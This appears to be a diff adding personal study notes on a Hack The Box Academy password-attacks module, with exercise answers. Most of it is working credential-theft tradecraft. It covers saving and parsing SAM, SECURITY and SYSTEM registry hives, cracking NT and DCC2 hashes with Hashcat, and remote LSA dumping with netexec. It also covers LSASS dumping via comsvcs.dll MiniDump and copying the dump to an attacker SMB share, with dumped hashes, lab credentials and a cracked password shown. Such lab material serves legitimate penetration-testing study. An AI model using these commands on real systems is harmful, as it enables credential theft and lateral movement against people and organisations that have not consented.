@@ -908,3 +908,269 @@ With this in mind, we can copy the NT hashes associated with each user account i
 ## Cracking hashes with Hashcat
 
 Once we have the hashes, we can begin cracking them using [Hashcat](https://hashcat.net/hashcat/). Hashcat supports a wide range of hashing algorithms, as outlined on its website. In this module, we will focus on using Hashcat for specific use cases. This approach will help build your understanding of how and when to use Hashcat effectively, and how to refer to its documentation to identify the appropriate mode and options based on the type of hashes you've captured.
+#### Running Hashcat against NT hashes
+
+Hashcat supports many different modes, and selecting the right one depends largely on the type of attack and the specific hash type we want to crack. Covering all available modes is beyond the scope of this module, so we will focus on using the `-m` option to specify hash type `1000`, which corresponds to NT hashes (also known as NTLM-based hashes). For a full list of supported hash types and their associated mode numbers, we can refer to Hashcat's [wiki page](https://hashcat.net/wiki/doku.php?id=example_hashes) or consult the man page.
+
+```shell
+sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
+```
+
+ It is very common for users to reuse passwords across different work and personal accounts. Understanding and applying this technique can be valuable during assessments. We will benefit from it anytime we encounter a vulnerable Windows system and gain administrative rights to dump the SAM database.
+## DCC2 hashes
+
+As mentioned previously, `hklm\security` contains cached domain logon information, specifically in the form of DCC2 hashes. These are local, hashed copies of network credential hashes. An example is:
+
+```shell
+inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
+```
+
+This type of hash is much more difficult to crack than an NT hash, as it uses PBKDF2. Additionally, it cannot be used for lateral movement with techniques like Pass-the-Hash (which we will cover later). The Hashcat mode for cracking DCC2 hashes is `2100`.
+
+```shell
+hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
+```
+## DPAPI
+
+In addition to the DCC2 hashes, we previously saw that the `machine and user keys` for `DPAPI` were also dumped from `hklm\security`. The Data Protection Application Programming Interface, or [DPAPI](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection), is a set of APIs in Windows operating systems used to encrypt and decrypt data blobs on a per-user basis.
+
+|Applications|Use of DPAPI|
+|---|---|
+|`Internet Explorer`|Password form auto-completion data (username and password for saved sites).|
+|`Google Chrome`|Password form auto-completion data (username and password for saved sites).|
+|`Outlook`|Passwords for email accounts.|
+|`Remote Desktop Connection`|Saved credentials for connections to remote machines.|
+|`Credential Manager`|Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more.|
+DPAPI encrypted credentials can be decrypted manually with tools like Impacket's [dpapi](https://github.com/fortra/impacket/blob/master/examples/dpapi.py), [mimikatz](https://github.com/gentilkiwi/mimikatz), or remotely with [DonPAPI](https://github.com/login-securite/DonPAPI).
+
+```shell
+mimikatz.exe
+```
+## Remote dumping & LSA secrets considerations
+
+With access to credentials that have `local administrator privileges`, it is also possible to target LSA secrets over the network. This may allow us to extract credentials from running services, scheduled tasks, or applications that store passwords using LSA secrets.
+#### Dumping LSA secrets remotely
+
+```shell
+netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
+```
+#### Dumping SAM Remotely
+
+Similarly, we can use netexec to dump hashes from the SAM database remotely.
+
+```shell
+netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
+```
+## Exercise
+
+### Where is the SAM database located in the Windows registry? (Format: ****\***)
+
+hklm\sam
+### Apply the concepts taught in this section to obtain the password to the ITbackdoor user account on the target. Submit the clear-text password as the answer.
+
+```shell
+C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
+
+C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
+
+C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
+```
+
+The smbclient didn't work so I created my own Drag and Drop server to tranfer files.
+
+Once I have the files in my attack machine:
+
+```shell
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+---
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0xd33955748b2d17d7b09c9cb2653dd0e8
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
+bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
+jason:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
+ITbackdoor:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
+frontdesk:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
+dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
+[*] NL$KM 
+ 0000   E4 FE 18 4B 25 46 81 18  BF 23 F5 A3 2A E8 36 97   ...K%F...#..*.6.
+ 0010   6B A4 92 B3 A4 32 DE B3  91 17 46 B8 EC 63 C4 51   k....2....F..c.Q
+ 0020   A7 0C 18 26 E9 14 5A A2  F3 42 1B 98 ED 0C BD 9A   ...&..Z..B......
+ 0030   0C 1A 1B EF AC B3 76 C5  90 FA 7B 56 CA 1B 48 8B   ......v...{V..H.
+NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
+[*] _SC_gupdate 
+(Unknown User):Password123
+[*] Cleaning up...
+```
+
+```shell
+hashcat -m 1000 'c02478537b9727d391bc80011c2e2321' /usr/share/wordlists/rockyou.txt
+---
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+c02478537b9727d391bc80011c2e2321:matrix                   
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 1000 (NTLM)
+Hash.Target......: c02478537b9727d391bc80011c2e2321
+Time.Started.....: Wed Sep 30 17:34:45 2026 (0 secs)
+Time.Estimated...: Wed Sep 30 17:34:45 2026 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   751.3 kH/s (0.06ms) @ Accel:512 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 1024/14344385 (0.01%)
+Rejected.........: 0/1024 (0.00%)
+Restore.Point....: 0/14344385 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: 123456 -> bethany
+Hardware.Mon.#1..: Util: 53%
+
+Started: Wed Sep 30 17:34:29 2026
+Stopped: Wed Sep 30 17:34:46 2026
+```
+
+> [!Answer] 
+> Matrix
+
+### Dump the LSA secrets on the target and discover the credentials stored. Submit the username and password as the answer. (Format: username:password, Case-Sensitive)
+
+```shell
+etexec smb 10.129.202.137 --local-auth -u Bob -p HTB_@cademy_stdnt! --lsa
+```
+# Attacking LSASS
+
+In addition to acquiring copies of the SAM database to extract and crack password hashes, we will also benefit from targeting the [Local Security Authority Subsystem Service (LSASS)](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service). As covered in the `Credential Storage` section of this module, LSASS is a core Windows process responsible for enforcing security policies, handling user authentication, and storing sensitive credential material in memory.
+
+Upon initial logon, LSASS will:
+
+- Cache credentials locally in memory
+- Create [access tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
+- Enforce security policies
+- Write to Windows' [security log](https://docs.microsoft.com/en-us/windows/win32/eventlog/event-logging-security)
+## Dumping LSASS process memory
+
+Similar to the process of attacking the SAM database, it would be wise for us first to create a copy of the contents of LSASS process memory via the generation of a memory dump. Creating a dump file lets us extract credentials offline using our attack host. Keep in mind conducting attacks offline gives us more flexibility in the speed of our attack and requires less time spent on the target system. There are countless methods we can use to create a memory dump, so let's cover techniques that can be performed using tools already built into Windows.
+#### Task Manager method
+
+With access to an interactive graphical session on the target, we can use task manager to create a memory dump. This requires us to:
+
+1. Open `Task Manager`
+2. Select the `Processes` tab
+3. Find and right click the `Local Security Authority Process`
+4. Select `Create dump file`
+
+A file called `lsass.DMP` is created and saved in `%temp%`. This is the file we will transfer to our attack host. We can use the file transfer method discussed in the previous section of this module to transfer the dump file to our attack host.
+#### Rundll32.exe & Comsvcs.dll method
+
+The Task Manager method is dependent on us having a GUI-based interactive session with a target. We can use an alternative method to dump LSASS process memory through a command-line utility called [rundll32.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32).
+
+This way is faster than the Task Manager method and more flexible because we may gain a shell session on a Windows host with only access to the command line.
+
+>[!Important]
+>It is important to note that modern anti-virus tools recognize this method as malicious activity.
+
+Before issuing the command to create the dump file, we must determine what process ID (`PID`) is assigned to `lsass.exe`. This can be done from cmd or PowerShell:
+#### Finding LSASS's PID in cmd
+
+From cmd, we can issue the command `tasklist /svc` to find `lsass.exe` and its process ID.
+
+```powershell
+tasklist /svc # 672
+```
+#### Finding LSASS's PID in PowerShell
+
+From PowerShell, we can issue the command `Get-Process lsass` and see the process ID in the `Id` field.
+
+```shell
+Get-Process lsass # 672
+```
+
+Once we have the PID assigned to the LSASS process, we can create a dump file.
+#### Creating a dump file using PowerShell
+
+With an elevated PowerShell session, we can issue the following command to create a dump file:
+
+```powershell
+rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
+```
+
+With this command, we are running `rundll32.exe` to call an exported function of `comsvcs.dll` which also calls the MiniDumpWriteDump (`MiniDump`) function to dump the LSASS process memory to a specified directory (`C:\lsass.dmp`). Recall that most modern AV tools recognize this as malicious activity and prevent the command from executing. In these cases, we will need to consider ways to bypass or disable the AV tool we are facing. AV bypassing techniques are outside of the scope of this module.
+
+If we manage to run this command and generate the `lsass.dmp` file, we can proceed to transfer the file onto our attack box to attempt to extract any credentials that may have been stored in LSASS process memory.
+
+>[!Note]
+>We can use the file transfer method discussed in the Attacking SAM section to get the lsass.dmp file from the target to our attack host.
+## Using Pypykatz to extract credentials
+
+Once we have the dump file on our attack host, we can use a powerful tool called [pypykatz](https://github.com/skelsec/pypykatz) to extract credentials from the `.dmp` file. Pypykatz is an implementation of Mimikatz written entirely in Python. The fact that it is written in Python allows us to run it on Linux-based attack hosts. At the time of writing, Mimikatz only runs on Windows systems, so to use it, we would either need to use a Windows attack host or we would need to run Mimikatz directly on the target, which is not an ideal scenario.
+
+Recall that LSASS stores credentials that have active logon sessions on Windows systems. When we dumped LSASS process memory into the file, we essentially took a "snapshot" of what was in memory at that point in time. If there were any active logon sessions, the credentials used to establish them will be present. Let's run Pypykatz against the dump file and find out.
+#### Running Pypykatz
+
+The command initiates the use of `pypykatz` to parse the secrets hidden in the LSASS process memory dump. We use `lsa` in the command because LSASS is a subsystem of the `Local Security Authority`, then we specify the data source as a `minidump` file, proceeded by the path to the dump file stored on our attack host. Pypykatz parses the dump file and outputs the findings:
+
+```shell
+pypykatz lsa minidump /home/peter/Documents/lsass.dmp
+```
+#### MSV
+
+[MSV](https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package) is an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database. Pypykatz extracted the `SID`, `Username`, `Domain`, and even the `NT` & `SHA1` password hashes associated with the bob user account's logon session stored in LSASS process memory. This will prove helpful in the next step of our attack covered at the end of this section.
+#### WDIGEST
+`WDIGEST` is an older authentication protocol enabled by default in `Windows XP` - `Windows 8` and `Windows Server 2003` - `Windows Server 2012`. LSASS caches credentials used by WDIGEST in clear-text. This means if we find ourselves targeting a Windows system with WDIGEST enabled, we will most likely see a password in clear-text. Modern Windows operating systems have WDIGEST disabled by default. Additionally, it is essential to note that Microsoft released a security update for systems affected by this issue with WDIGEST.
+#### Kerberos
+
+[Kerberos](https://web.mit.edu/kerberos/#what_is) is a network authentication protocol used by Active Directory in Windows Domain environments. Domain user accounts are granted tickets upon authentication with Active Directory. This ticket is used to allow the user to access shared resources on the network that they have been granted access to without needing to type their credentials each time. LSASS caches `passwords`, `ekeys`, `tickets`, and `pins` associated with Kerberos. It is possible to extract these from LSASS process memory and use them to access other systems joined to the same domain.
+#### DPAPI
+
+Mimikatz and Pypykatz can extract the DPAPI `masterkey` for logged-on users whose data is present in LSASS process memory. These masterkeys can then be used to decrypt the secrets associated with each of the applications using DPAPI and result in the capturing of credentials for various accounts. DPAPI attack techniques are covered in greater detail in the [Windows Privilege Escalation](https://academy.hackthebox.com/module/details/67) module.
+
+#### Cracking the NT Hash with Hashcat
+
+We can use Hashcat to crack the NT Hash. In this example, we only found one NT hash associated with the Bob user. After setting the mode in the command, we can paste the hash, specify a wordlist, and then crack the hash.
+
+```shell
+sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
+```
+## Exercise
+### What is the name of the executable file associated with the Local Security Authority Process?
+
+lsass.exe
+### Apply the concepts taught in this section to obtain the password to the Vendor user account on the target. Submit the clear-text password as the answer. (Format: Case sensitive)
+
+```shell
+# Victim
+rundll32 C:\windows\system32\comsvcs.dll, MiniDump 660 C:\lsass.dmp full
+# Attacker
+sudo impacket-smbserver share -smb2support ~/Desktop/HTB/CPTS/Password\ Attacks/SAM
+# Victim
+copy C:\Users\htb-student\lsass.dmp \\10.10.14.188\share\
+```
+
+```shell
+# Installing pypykatz in the venv
+pip3 install pypykatz
+
+# Extracting credentials
+pypykatz lsa minidump lsass.dmp
+
+# Cracking the hash
+hashcat -m 1000 '31f87811133bc6aaa75a536e77f64314' /usr/share/wordlists/rockyou.txt
+```
+
+
